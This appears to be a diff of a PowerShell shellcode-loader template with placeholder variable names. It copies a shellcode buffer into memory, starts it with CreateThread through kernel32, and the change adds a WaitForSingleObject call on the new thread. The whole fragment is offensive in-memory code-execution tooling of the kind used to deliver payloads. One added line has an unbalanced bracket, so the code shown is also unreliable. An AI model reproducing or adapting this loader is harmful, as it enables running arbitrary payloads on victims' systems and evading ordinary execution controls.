@@ -27,4 +27,5 @@ for ($i=0;$i -le ($%{var_code}.Length-1);$i++) {
 	$%{var_memset}.Invoke([IntPtr]($%{var_buffer}.ToInt32()+$i), $%{var_code}[$i], 1) | Out-Null
 }
 
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll CreateThread), (%{func_get_delegate_type} @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))).Invoke([IntPtr]::Zero,0,$%{var_buffer},[IntPtr]::Zero,0,[IntPtr]::Zero) | Out-Null		
+$%{var_hthread} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll CreateThread), (%{func_get_delegate_type} @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr))).Invoke([IntPtr]::Zero,0,$%{var_buffer},[IntPtr]::Zero,0,[IntPtr]::Zero) | Out-Null
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll WaitForSingleObject), (%{func_get_delegate_type} @([IntPtr], [Int32]))).Invoke($%{var_hthread},0xFFFFFFFF) | Out-Null
